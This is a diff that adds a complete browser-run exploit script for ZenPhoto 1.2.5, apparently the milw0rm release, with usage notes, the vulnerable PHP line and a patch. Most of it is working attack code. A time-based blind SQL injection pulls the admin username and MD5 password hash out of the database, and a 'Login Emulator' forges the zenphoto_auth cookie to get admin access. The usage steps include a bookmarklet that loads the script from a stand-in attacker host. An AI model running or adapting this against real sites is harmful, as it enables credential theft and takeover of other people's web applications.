@@ -1,0 +1,588 @@
+/*
+ * ZenPhoto 1.2.5 Completly Blind SQL Injection Exploit
+ * Requirements: magic_quotes = ANY (zenpage disables it anyway), ZenPage needs to be activated and have at least one news category
+ * 
+ * What does this exploit let you do:
+ * The precoded functions I provided will allow you to extract the username and password hash of the admin from the database.
+ * It will also let you login to the admin panel w/o actually knowing the plain text password (only the username and hash are required)
+ * 
+ * How To Use:
+ * 1) upload this script to http://attacker/exploit.js
+ * 2) open a vulnerable category in your webbrowser (Example: http://victim/zenphoto/news/category/anycategorynamehere)
+ * 3) Enter the following code into your address bar:
+ * javascript:(function(){var url = "http://attacker/exploit.js"; var evil = document.createElement('script'); evil.src = url; document.body.appendChild(evil);})();
+ * 4) Press enter and wait for the exploit console to show
+ * 5) You may now extract the username/password hash from the database (buggy  :(  )
+ * 6) Use the username/password hash with the Login Emulation tool to login to the admin panel
+ * 7) Have fun  :) 
+ * 
+ * WARNING: THIS IS BUGGY! You might not get the hash/username correct the first time. Play with the settings below to tweak it so it works better for you
+ * 
+ * Why this works:
+ * The sanitize function doesn't escape single quotes...
+ * 
+ * Vulnerable Code (index.php):
+ * 95: $catname = sanitize($_GET['category']);
+ * 96: query("UPDATE ".prefix('zenpage_news_categories')." SET `hitcounter` = `hitcounter`+1 WHERE `cat_link` = '".$catname."'",true);
+ *
+ * Patch:
+ * 95: $catname = mysql_real_escape_string($_GET['category']);
+ * 
+ * Example Exploitation:
+ * /zenphoto/news/category/cat1' and hitcounter = (SELECT IF(SUBSTRING(password,1 ,1) = 'A',BENCHMARK(5000000,ENCODE('this will probably','waste some time')),null) FROM zp_administrators) and '1' = '1
+ *
+ * This payload will delay the page from loading for about 5 seconds if the first letter of the password hash is 'A'
+ * 
+ * The time detection isn't perfect and was pretty much slapped together. Make sure you try editing the variables below or
+ * make your own injector :P
+ * 
+ * Discovered and Coded by petros@dusecurity.com
+ * Shoutz to xplorer and the rest of the DuSec Team
+ */
+
+
+// Change this if you are having problems with the injection
+var patience = .8; // Time in seconds on how patient we are. Will be substracted from the benchmark time
+var max_retries = 3; // maximum retries after failed HTTP request
+var charset_hash = "0123456789abcdef".split(''); // charset for the password hash
+var charset_username = "abcdefghiklmnopqrstuvqxzy0123456789ABCEDFGHIJKLMNOPQRSTUVWXYZ ._".split(''); // charset for the username
+var username_max = 64; // max length of the username
+var hash_max = 32; // max length of password hash (its md5..i wouldnt change this)
+var benchmark_code = "BENCHMARK(5850000,ENCODE('this will probably','waste some time'))"; // code used to slow down requests if the query is true
+var show_timing = false; // whether or not to show the timings of each request (good for debugging)
+var delay = 1500; // delay in miliseconds between request
+var err_delay = 1000; //delay in miliseconds to wait after an error
+
+
+// Dont edit below this line
+var display = false;
+var display_loot = false;
+var loot = false;
+var loot_username = false;
+var loot_password = false;
+
+function get(page) // returns how long it took to send/receive the request...
+{
+	var xhr = window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest();
+	
+	xhr.open('GET', page, false); // keep it syncronized..
+		xhr.setRequestHeader( "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT" ); // cache..
+	var seconds = getTime();
+	xhr.send(null);
+	seconds = getTime() - seconds;
+	var success = (xhr.readyState == 4 && xhr.status == 200);
+	xhr = null; // dispose
+	return { 'miliseconds': seconds, 'seconds': seconds / 1000, 'success': success };
+	
+}
+function getTime()
+{
+	return Math.round(new Date().getTime());
+}
+function createDisplay() // create the display div
+{
+	var div = document.createElement("DIV");
+	div.style.backgroundColor = '#C3FFB9';
+	div.style.border = '2px dashed green';
+	div.style.margin = '3px';
+	div.style.paddingLeft = '10px';
+	div.style.paddingBottom = '10px';
+	
+	div.innerHTML = '<h2>ZenPhoto Blind Injection -- petros@dusecurity</h2><p><br /></p>';
+	display = document.createElement("P");
+	
+	document.body.insertBefore(div, document.body.childNodes[0]);
+	div.appendChild(display);
+}
+
+function write(text)
+{
+	display.innerHTML += text + "<br />";
+}
+
+function setDisplay(text)
+{
+	display.innerHTML = text;
+}
+
+function clearDisplay()
+{
+	display.innerHTML = '';
+}
+function getPath()
+{
+	return window.location.pathname;
+}
+
+function showMenu()
+{
+	clearDisplay();
+	write('What you like to do?');
+	var ul = document.createElement('OL'); // changed to OL so they know to do it in steps
+	createListItem('Extract Admin Username', 'extractusername();',ul);
+	createListItem('Extract Admin Password','extractpassword();',ul);
+	createListItem('Login to Admin using Hash', 'adminlogin();', ul);
+	display.appendChild(ul);
+}
+var un;
+var pw;
+function adminlogin()
+{
+	clearDisplay();
+	write("Admin Login Emulator: ");
+	un = createTextbox('Username: ', (loot_username) ? loot_username : '[Enter Username]');
+	pw = createTextbox('Password: ', (loot_password) ? loot_password: '[Enter Hash]');
+	createButton('Pwn!', "step2();");
+	write('<br /><a href="javascript:showMenu();">Back To Menu</a>');
+
+}
+function step2()
+{
+		var username = un.value;
+		var password = pw.value;
+		var auth =MD5(username + password);
+		SetCookie('zenphoto_auth', MD5(username + password), 30);
+		clearDisplay();
+		write("Generated auth cookie: zenphoto_auth=" + auth);
+		write("You are now logged in with admin privileges :)");
+		write('<a href="../../zp-core/admin.php">Enter Admin Panel</a>');
+		write('<br /><a href="javascript:showMenu();">Back To Menu</a>');
+
+}
+function createTextbox(label, value)
+{
+	display.innerHTML += "<strong>" + label + "</strong>";
+	var tb = document.createElement('input');
+	tb.type = 'text';
+	tb.value = value;
+	display.appendChild(tb);
+	write('');
+	return tb;
+	
+}
+function createButton(text, click)
+{
+	write("<BUTTON onclick=\"" + click + "\">" + text + "</BUTTON>");
+	
+}
+function addEvent(elem, type, handle)
+{
+	if (elem.addEventListener)
+			elem.addEventListener(type, handle, false);
+	else if (elem.attachEvent)
+			elem.attachEvent("on" + type, handle);
+}
+// borrowed function
+function SetCookie(cookieName,cookieValue,nDays) {
+ var today = new Date();
+ var expire = new Date();
+ if (nDays==null || nDays==0) nDays=1;
+ expire.setTime(today.getTime() + 3600000*24*nDays);
+ document.cookie = cookieName+"="+escape(cookieValue)
+                 + ";expires="+expire.toGMTString() + ";path=../../";
+}
+
+function extractusername()
+{
+	clearDisplay();
+	var path = getPath();
+	var basetime = 0;
+	var benchmark = 0;
+	var diff = 0;
+	var offset = 0;
+	var charset_len = charset_username.length;
+	var resp = false;
+	loot = '';
+	display_loot = false;
+	write("Extracting username..");
+	write("Using path: " + path);
+	
+	resp = get(path);
+	if(!resp.success) { write("Failed to request page."); return; }
+	basetime = resp.miliseconds;
+	write("Normal request time set to " + basetime + " milisecond(s)");
+	resp = get(path + "' and hitcounter = (SELECT IF('1' = '1',"+benchmark_code+",null)) and '1' = '1");
+	benchmark = resp.miliseconds;
+	diff = benchmark - basetime;
+	if(diff <= (patience * 1000)){ alert("Error calculating request difference! Try again later."); showMenu();}
+	write("Benchmark request time set to " + benchmark + " milisecond(s)");
+	if(benchmark <= (basetime + (patience * 1000))){ write("Error: Benchmark took less time than expected. Script might be patched or magic_quotes may be enabled. Make sure you are NOT logged in a try again."); return;}
+	write("Username: <div id=\"loot\"></div>");
+	display_loot = document.getElementById('loot');
+	var retries = 0;
+	var min = diff - (patience * 1000);
+	var best_match = 0;
+	var best = '';
+	if(min < 0) { write("Error: Benchmark took less time than expected. Please try again later."); return;}
+	function readNextChar()
+	{
+		var c = charset_username[offset];
+		display_loot.innerHTML = '';
+		display_loot.innerHTML += loot + c;
+		
+		resp = get(path + "' and hitcounter = (SELECT IF(SUBSTRING(user,"+ (loot.length + 1)+" ,1) = '"+ c +"',"+ benchmark_code+",null) FROM zp_administrators LIMIT 0,1) and '1' = '1");
+		if(!resp.success) { ++retries; if(retries >= max_retries) { write("failed to execute exploit (too many errors)"); return;} setTimeout(readNextChar, err_delay); return;}
+		retries = 0; //reset error counter
+		var took = resp.miliseconds - basetime; //difference
+	
+		if(took > 0 && best_match < took) {best_match = took; best = c;}
+		if(show_timing)
+			write(loot.length + 1 + "> "+ 'char= ' + c + ', took= ' + took + ', min= ' + min);
+		if(took >=  min)
+		{
+			loot += c;
+			if(show_timing)
+			write("got \"" + loot + "\" so far...");
+			display_loot.innerHTML = '';
+			display_loot.innerHTML += loot;
+			best = '';
+			best_match = 0;
+			offset = 0;
+		}
+		else
+			offset++;
+			
+		if(loot.length >= username_max)
+		{
+			display_loot.innerHTML = ''; display_loot += loot;
+			loot_username = loot;
+			write('<a href="javascript:showMenu();">Back To Menu</a>');
+			alert("Admin Username is \"" + loot + "\"\r\n(reached max length)");
+			return;
+		}
+		if(offset < charset_len)
+			setTimeout(readNextChar, delay);
+		else
+		{
+			if(loot.length < username_max)
+			{
+				write("best match: " + best_match); 
+				function beAnAsshole(){
+				loot +=  best;
+				best = ''; best_match = 0;
+				display_loot.innerHTML = '';
+				display_loot.innerHTML += loot;
+				offset = 0;
+				setTimeout(readNextChar, delay);
+				return;}
+			}
+			display_loot.innerHTML = '';
+			display_loot.innerHTML += loot;
+			loot_username = loot;
+			write('<a href="javascript:showMenu();">Back To Menu</a>');
+			
+			alert("Admin Username is \"" + loot + "\"");
+		}
+	}
+		readNextChar();
+	}
+
+function extractpassword()
+{
+	clearDisplay();
+	var path = getPath();
+	var basetime = 0;
+	var benchmark = 0;
+	var diff = 0;
+	var offset = 0;
+	var charset_len = charset_hash.length;
+	var resp = false;
+	loot = '';
+	display_loot = false;
+	write("Extracting password..");
+	write("Using path: " + path);
+	
+	resp = get(path);
+	if(!resp.success) { write("Failed to request page."); return; }
+	basetime = resp.miliseconds;
+	write("Normal request time set to " + basetime + " milisecond(s)");
+	resp = get(path + "' and hitcounter = (SELECT IF('1' = '1',"+benchmark_code+",null)) and '1' = '1");
+	benchmark = resp.miliseconds;
+	write("Benchmark request time set to " + benchmark + " milisecond(s)");
+	if(benchmark <= (basetime + (patience * 1000))){ write("Error: Benchmark took less time than expected. Script might be patched or magic_quotes may be enabled. Make sure you are NOT logged in a try again."); return;}
+	write("Password: <div id=\"loot\"></div>");
+	display_loot = document.getElementById('loot');
+	var retries = 0;
+	diff = benchmark - basetime;
+	if(diff <= 0) { alert("Failed to determine difference. Try again later"); showMenu(); return;}
+	var min = diff- (patience * 1000);
+	var best_match = 0;
+	var best = '';
+	if(min < 0) { write("Error: Benchmark took less time than expected. Please try again later."); return;}
+	function readNextChar()
+	{
+		var c = charset_hash[offset];
+		display_loot.innerHTML = '';
+		display_loot.innerHTML += loot + c;
+		
+		resp = get(path + "' and hitcounter = (SELECT IF(SUBSTRING(password,"+ (loot.length + 1)+" ,1) = '"+ c +"',"+ benchmark_code+",null) FROM zp_administrators LIMIT 0,1) and '1' = '1");
+		if(!resp.success) { ++retries; if(retries >= max_retries) { write("failed to execute exploit (too many errors)"); return;} setTimeout(readNextChar, err_delay); return;}
+		var took = resp.miliseconds - basetime;
+		retries = 0;
+		if(took > 0 && took > best_match) {best_match = took; best = c;}
+		if(show_timing)
+			write(loot.length + "> "+ 'char= ' + c + ', took= ' + took + ', min= ' + min);
+		if(took >=  min)
+		{
+			loot += c;
+			display_loot.innerHTML = '';
+			display_loot.innerHTML += loot;
+			offset = 0;
+			best = ''; best_match = 0;
+		}
+		else
+			offset++;
+		if(loot.length >= hash_max)
+		{
+			display_loot.innerHTML = ''; display_loot += loot;
+			loot_password = loot;
+			write('<a href="javascript:showMenu();">Back To Menu</a>');
+			alert("Admin Password Hash is \"" + loot + "\"\r\n(reached max length)");
+			return;
+		}
+		if(offset < charset_len)
+			setTimeout(readNextChar, delay);
+		else
+		{
+			if(loot.length < hash_max)
+			{
+				loot +=  best;
+				best = ''; best_match = 0;
+				display_loot.innerHTML = '';
+				display_loot.innerHTML += loot;
+				offset = 0;
+				setTimeout(readNextChar, delay);
+				return;
+			}
+			display_loot.innerHTML = '';
+			display_loot.innerHTML += loot;
+			loot_password = loot;
+			write('<a href="javascript:showMenu();">Back To Menu</a>');
+			alert("Admin Password Hash is \"" + loot + "\"");
+		}
+	}
+		readNextChar();
+	}
+
+
+function createListItem(label, onclick, list)
+{
+	var li = document.createElement("LI");
+	li.innerHTML = '<a href="javascript:' + onclick + '">' + label + "</a>";
+	list.appendChild(li);
+
+}
+
+createDisplay();
+showMenu();
+
+
+/**
+*
+*  MD5 (Message-Digest Algorithm)
+*  http://www.webtoolkit.info/
+*
+**/
+ 
+var MD5 = function (string) {
+ 
+	function RotateLeft(lValue, iShiftBits) {
+		return (lValue<<iShiftBits) | (lValue>>>(32-iShiftBits));
+	}
+ 
+	function AddUnsigned(lX,lY) {
+		var lX4,lY4,lX8,lY8,lResult;
+		lX8 = (lX & 0x80000000);
+		lY8 = (lY & 0x80000000);
+		lX4 = (lX & 0x40000000);
+		lY4 = (lY & 0x40000000);
+		lResult = (lX & 0x3FFFFFFF)+(lY & 0x3FFFFFFF);
+		if (lX4 & lY4) {
+			return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
+		}
+		if (lX4 | lY4) {
+			if (lResult & 0x40000000) {
+				return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
+			} else {
+				return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
+			}
+		} else {
+			return (lResult ^ lX8 ^ lY8);
+		}
+ 	}
+ 
+ 	function F(x,y,z) { return (x & y) | ((~x) & z); }
+ 	function G(x,y,z) { return (x & z) | (y & (~z)); }
+ 	function H(x,y,z) { return (x ^ y ^ z); }
+	function I(x,y,z) { return (y ^ (x | (~z))); }
+ 
+	function FF(a,b,c,d,x,s,ac) {
+		a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));
+		return AddUnsigned(RotateLeft(a, s), b);
+	};
+ 
+	function GG(a,b,c,d,x,s,ac) {
+		a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));
+		return AddUnsigned(RotateLeft(a, s), b);
+	};
+ 
+	function HH(a,b,c,d,x,s,ac) {
+		a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));
+		return AddUnsigned(RotateLeft(a, s), b);
+	};
+ 
+	function II(a,b,c,d,x,s,ac) {
+		a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac));
+		return AddUnsigned(RotateLeft(a, s), b);
+	};
+ 
+	function ConvertToWordArray(string) {
+		var lWordCount;
+		var lMessageLength = string.length;
+		var lNumberOfWords_temp1=lMessageLength + 8;
+		var lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))/64;
+		var lNumberOfWords = (lNumberOfWords_temp2+1)*16;
+		var lWordArray=Array(lNumberOfWords-1);
+		var lBytePosition = 0;
+		var lByteCount = 0;
+		while ( lByteCount < lMessageLength ) {
+			lWordCount = (lByteCount-(lByteCount % 4))/4;
+			lBytePosition = (lByteCount % 4)*8;
+			lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)<<lBytePosition));
+			lByteCount++;
+		}
+		lWordCount = (lByteCount-(lByteCount % 4))/4;
+		lBytePosition = (lByteCount % 4)*8;
+		lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80<<lBytePosition);
+		lWordArray[lNumberOfWords-2] = lMessageLength<<3;
+		lWordArray[lNumberOfWords-1] = lMessageLength>>>29;
+		return lWordArray;
+	};
+ 
+	function WordToHex(lValue) {
+		var WordToHexValue="",WordToHexValue_temp="",lByte,lCount;
+		for (lCount = 0;lCount<=3;lCount++) {
+			lByte = (lValue>>>(lCount*8)) & 255;
+			WordToHexValue_temp = "0" + lByte.toString(16);
+			WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2);
+		}
+		return WordToHexValue;
+	};
+ 
+	function Utf8Encode(string) {
+		string = string.replace(/\r\n/g,"\n");
+		var utftext = "";
+ 
+		for (var n = 0; n < string.length; n++) {
+ 
+			var c = string.charCodeAt(n);
+ 
+			if (c < 128) {
+				utftext += String.fromCharCode(c);
+			}
+			else if((c > 127) && (c < 2048)) {
+				utftext += String.fromCharCode((c >> 6) | 192);
+				utftext += String.fromCharCode((c & 63) | 128);
+			}
+			else {
+				utftext += String.fromCharCode((c >> 12) | 224);
+				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+				utftext += String.fromCharCode((c & 63) | 128);
+			}
+ 
+		}
+ 
+		return utftext;
+	};
+ 
+	var x=Array();
+	var k,AA,BB,CC,DD,a,b,c,d;
+	var S11=7, S12=12, S13=17, S14=22;
+	var S21=5, S22=9 , S23=14, S24=20;
+	var S31=4, S32=11, S33=16, S34=23;
+	var S41=6, S42=10, S43=15, S44=21;
+ 
+	string = Utf8Encode(string);
+ 
+	x = ConvertToWordArray(string);
+ 
+	a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
+ 
+	for (k=0;k<x.length;k+=16) {
+		AA=a; BB=b; CC=c; DD=d;
+		a=FF(a,b,c,d,x[k+0], S11,0xD76AA478);
+		d=FF(d,a,b,c,x[k+1], S12,0xE8C7B756);
+		c=FF(c,d,a,b,x[k+2], S13,0x242070DB);
+		b=FF(b,c,d,a,x[k+3], S14,0xC1BDCEEE);
+		a=FF(a,b,c,d,x[k+4], S11,0xF57C0FAF);
+		d=FF(d,a,b,c,x[k+5], S12,0x4787C62A);
+		c=FF(c,d,a,b,x[k+6], S13,0xA8304613);
+		b=FF(b,c,d,a,x[k+7], S14,0xFD469501);
+		a=FF(a,b,c,d,x[k+8], S11,0x698098D8);
+		d=FF(d,a,b,c,x[k+9], S12,0x8B44F7AF);
+		c=FF(c,d,a,b,x[k+10],S13,0xFFFF5BB1);
+		b=FF(b,c,d,a,x[k+11],S14,0x895CD7BE);
+		a=FF(a,b,c,d,x[k+12],S11,0x6B901122);
+		d=FF(d,a,b,c,x[k+13],S12,0xFD987193);
+		c=FF(c,d,a,b,x[k+14],S13,0xA679438E);
+		b=FF(b,c,d,a,x[k+15],S14,0x49B40821);
+		a=GG(a,b,c,d,x[k+1], S21,0xF61E2562);
+		d=GG(d,a,b,c,x[k+6], S22,0xC040B340);
+		c=GG(c,d,a,b,x[k+11],S23,0x265E5A51);
+		b=GG(b,c,d,a,x[k+0], S24,0xE9B6C7AA);
+		a=GG(a,b,c,d,x[k+5], S21,0xD62F105D);
+		d=GG(d,a,b,c,x[k+10],S22,0x2441453);
+		c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681);
+		b=GG(b,c,d,a,x[k+4], S24,0xE7D3FBC8);
+		a=GG(a,b,c,d,x[k+9], S21,0x21E1CDE6);
+		d=GG(d,a,b,c,x[k+14],S22,0xC33707D6);
+		c=GG(c,d,a,b,x[k+3], S23,0xF4D50D87);
+		b=GG(b,c,d,a,x[k+8], S24,0x455A14ED);
+		a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905);
+		d=GG(d,a,b,c,x[k+2], S22,0xFCEFA3F8);
+		c=GG(c,d,a,b,x[k+7], S23,0x676F02D9);
+		b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A);
+		a=HH(a,b,c,d,x[k+5], S31,0xFFFA3942);
+		d=HH(d,a,b,c,x[k+8], S32,0x8771F681);
+		c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122);
+		b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C);
+		a=HH(a,b,c,d,x[k+1], S31,0xA4BEEA44);
+		d=HH(d,a,b,c,x[k+4], S32,0x4BDECFA9);
+		c=HH(c,d,a,b,x[k+7], S33,0xF6BB4B60);
+		b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70);
+		a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6);
+		d=HH(d,a,b,c,x[k+0], S32,0xEAA127FA);
+		c=HH(c,d,a,b,x[k+3], S33,0xD4EF3085);
+		b=HH(b,c,d,a,x[k+6], S34,0x4881D05);
+		a=HH(a,b,c,d,x[k+9], S31,0xD9D4D039);
+		d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5);
+		c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8);
+		b=HH(b,c,d,a,x[k+2], S34,0xC4AC5665);
+		a=II(a,b,c,d,x[k+0], S41,0xF4292244);
+		d=II(d,a,b,c,x[k+7], S42,0x432AFF97);
+		c=II(c,d,a,b,x[k+14],S43,0xAB9423A7);
+		b=II(b,c,d,a,x[k+5], S44,0xFC93A039);
+		a=II(a,b,c,d,x[k+12],S41,0x655B59C3);
+		d=II(d,a,b,c,x[k+3], S42,0x8F0CCC92);
+		c=II(c,d,a,b,x[k+10],S43,0xFFEFF47D);
+		b=II(b,c,d,a,x[k+1], S44,0x85845DD1);
+		a=II(a,b,c,d,x[k+8], S41,0x6FA87E4F);
+		d=II(d,a,b,c,x[k+15],S42,0xFE2CE6E0);
+		c=II(c,d,a,b,x[k+6], S43,0xA3014314);
+		b=II(b,c,d,a,x[k+13],S44,0x4E0811A1);
+		a=II(a,b,c,d,x[k+4], S41,0xF7537E82);
+		d=II(d,a,b,c,x[k+11],S42,0xBD3AF235);
+		c=II(c,d,a,b,x[k+2], S43,0x2AD7D2BB);
+		b=II(b,c,d,a,x[k+9], S44,0xEB86D391);
+		a=AddUnsigned(a,AA);
+		b=AddUnsigned(b,BB);
+		c=AddUnsigned(c,CC);
+		d=AddUnsigned(d,DD);
+	}
+ 
+	var temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);
+ 
+	return temp.toLowerCase();
+}
+
+// milw0rm.com [2009-07-15]
